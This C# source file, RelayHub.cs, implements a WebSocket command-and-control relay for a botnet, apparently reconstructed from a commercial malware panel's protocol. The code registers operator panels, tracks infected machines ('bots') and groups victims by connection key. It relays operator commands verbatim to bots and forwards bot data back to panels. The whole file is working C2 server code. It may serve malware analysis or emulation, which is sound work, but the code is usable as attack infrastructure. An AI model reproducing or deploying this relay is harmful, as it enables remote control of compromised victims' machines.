// RelayHub.cs — the WebSocket C2 relay (ws://<server>:8080).
//
// Wire protocol (reconstructed from the panel):
//  Panel -> server, on connect:  {"itype":"slr_panel","subc":"join","idf":"<panel id>"}
//  Panel -> server, on exit:     {"itype":"slr_panel","subc":"out","idf":"<panel id>"}
//  Panel -> server, command:      {"itype":"slr_panel","subc":"com","idf":"<panel id>",
//                                  "pid":"<bot id>","secure":<bool>,"pdata":{...}}
//  Bot   -> server:              {"cip":"<bot ip>","type":"msg","pid":"<bot id>",
//                                  "cokey":"<connection key>","data":"<json string>"}
//    (BTEngine.HandleMessage: type must be "msg", data is a JSON string of
//     the payload dictionary; cokey must equal the server's SCkey or the
//     panel marks the bot blocked; pid identifies the bot.)
//
// The hub links bots to the panel by cokey: a bot is visible to any panel
// that built its payload with that connection key, which is how the vendor
// server grouped victims.

using System.Collections.Concurrent;
using System.Collections.Generic;
using Microsoft.Extensions.Logging;
using System.Net.WebSockets;
using System.Text;

namespace BtServer;

public class RelayHub
{
    public sealed class PanelClient
    {
        public string Idf;
        public WebSocket Socket;
        public string ConKey;   // panels authenticate with the account's conkey (optional field "cokey")
    }

    public sealed class BotClient
    {
        public string Pid;
        public string CoKey;
        public string Ip;
        public WebSocket Socket;
        public DateTime ConnectedAt = DateTime.UtcNow;
    }

    private readonly ConcurrentDictionary<string, PanelClient> _panels = new();
    private readonly ConcurrentDictionary<string, BotClient> _bots = new();
    private readonly ILogger<RelayHub> _log;
    private readonly ServerConfig _config;

    public RelayHub(ILogger<RelayHub> log, ServerConfig config)
    {
        _log = log;
        _config = config;
    }

    public int PanelCount => _panels.Count;
    public int BotCount => _bots.Count;
    public IReadOnlyDictionary<string, BotClient> Bots => _bots;

    /// <summary>Accept and run one WebSocket connection until it closes.</summary>
    public async Task RunConnectionAsync(WebSocket socket, string remoteIp)
    {
        var buffer = new byte[1 << 20];
        try
        {
            while (socket.State == WebSocketState.Open)
            {
                using var ms = new MemoryStream();
                WebSocketReceiveResult result;
                do
                {
                    result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None);
                        break;
                    }
                    ms.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                if (result.MessageType == WebSocketMessageType.Close) break;
                if (ms.Length == 0) continue;

                string message = Encoding.UTF8.GetString(ms.ToArray());
                if (!HandleMessage(message, socket, remoteIp))
                    return; // fatal protocol error — drop the connection
            }
        }
        catch (Exception ex)
        {
            _log.LogDebug("relay connection ended: {Message}", ex.Message);
        }
        finally
        {
            RemoveSocket(socket);
        }
    }

    /// <summary>Returns false when the connection must be dropped.</summary>
    private bool HandleMessage(string message, WebSocket socket, string remoteIp)
    {
        System.Text.Json.JsonDocument doc;
        try { doc = System.Text.Json.JsonDocument.Parse(message); }
        catch { _log.LogWarning("relay: non-JSON message from {Ip}", remoteIp); return true; }

        var root = doc.RootElement;
        string itype = GetString(root, "itype");
        string type = GetString(root, "type");

        if (itype == "slr_panel")
        {
            string subc = GetString(root, "subc");
            string idf = GetString(root, "idf");
            string cokey = GetString(root, "cokey");
            switch (subc)
            {
                case "join":
                {
                    var panel = new PanelClient { Idf = idf, Socket = socket, ConKey = cokey };
                    if (_panels.TryRemove(idf, out PanelClient old))
                        TrySend(old.Socket, "{\"itype\":\"slr_panel\",\"subc\":\"kicked\"}");
                    _panels[idf] = panel;
                    _log.LogInformation("panel joined: {Idf} from {Ip}", idf, remoteIp);
                    // Send the bot list so a reconnecting panel repopulates its grid
                    foreach (BotClient bot in _bots.Values)
                        TrySend(socket, BotIntro(bot));
                    return true;
                }
                case "out":
                    _panels.TryRemove(idf, out _);
                    _log.LogInformation("panel left: {Idf}", idf);
                    return true;
                case "com":
                {
                    string pid = GetString(root, "pid");
                    if (_bots.TryGetValue(pid, out BotClient bot))
                        TrySend(bot.Socket, message); // forward verbatim to the bot
                    else
                        _log.LogDebug("com for unknown bot {Pid}", pid);
                    return true;
                }
                default:
                    return true;
            }
        }

        if (type == "msg")
        {
            // bot -> panel
            string pid = GetString(root, "pid") ?? remoteIp;
            string cokey = GetString(root, "cokey");

            if (!string.IsNullOrEmpty(cokey) && !_config.ConnectionKeys.ContainsKey(cokey))
            {
                _log.LogWarning("bot {Pid} presented unknown cokey {CoKey}", pid, cokey);
                // still forward — the panel itself decides blocked/unknown-key handling
            }

            bool isNew = false;
            var bot = _bots.GetOrAdd(pid, _ =>
            {
                isNew = true;
                return new BotClient { Pid = pid, CoKey = cokey, Ip = remoteIp, Socket = socket };
            });
            bot.Socket = socket;
            if (bot.Ip != remoteIp) { bot.Ip = remoteIp; isNew = true; }
            if (bot.CoKey != cokey) { bot.CoKey = cokey; isNew = true; }

            if (isNew)
                _log.LogInformation("bot connected: {Pid} from {Ip} (cokey={CoKey})", pid, remoteIp, cokey);

            BroadcastToPanels(message, cokey);
            return true;
        }

        // Unknown shapes are ignored (logged) so misbehaving peers can't kill the relay.
        _log.LogDebug("relay: unrecognized message shape from {Ip}", remoteIp);
        return true;
    }

    /// <summary>Send a synthetic bot introduction (used on panel join).</summary>
    private static string BotIntro(BotClient bot)
        => System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, object>
        {
            ["itype"] = "slr_panel",
            ["subc"] = "botintro",
            ["pid"] = bot.Pid,
            ["cokey"] = bot.CoKey ?? "",
            ["ip"] = bot.Ip,
        });

    private void BroadcastToPanels(string message, string cokey)
    {
        foreach (PanelClient panel in _panels.Values)
        {
            // Only panels bound to the same connection key see this bot's traffic;
            // unbound panels (no cokey on join) see everything, like the vendor.
            if (string.IsNullOrEmpty(panel.ConKey) || panel.ConKey == cokey)
                TrySend(panel.Socket, message);
        }
    }

    private void RemoveSocket(WebSocket socket)
    {
        foreach (var kv in _panels)
            if (ReferenceEquals(kv.Value.Socket, socket))
                _panels.TryRemove(kv.Key, out _);
        foreach (var kv in _bots)
            if (ReferenceEquals(kv.Value.Socket, socket))
            {
                _bots.TryRemove(kv.Key, out _);
                _log.LogInformation("bot disconnected: {Pid}", kv.Key);
            }
    }

    private static void TrySend(WebSocket socket, string message)
    {
        try
        {
            if (socket.State == WebSocketState.Open)
                socket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message)),
                    WebSocketMessageType.Text, true, CancellationToken.None);
        }
        catch { /* connection died; cleanup happens in RunConnectionAsync */ }
    }

    private static string GetString(System.Text.Json.JsonElement e, string name)
    {
        if (e.ValueKind == System.Text.Json.JsonValueKind.Object &&
            e.TryGetProperty(name, out var v) &&
            (v.ValueKind == System.Text.Json.JsonValueKind.String || v.ValueKind == System.Text.Json.JsonValueKind.Number))
            return v.ToString();
        return null;
    }
}
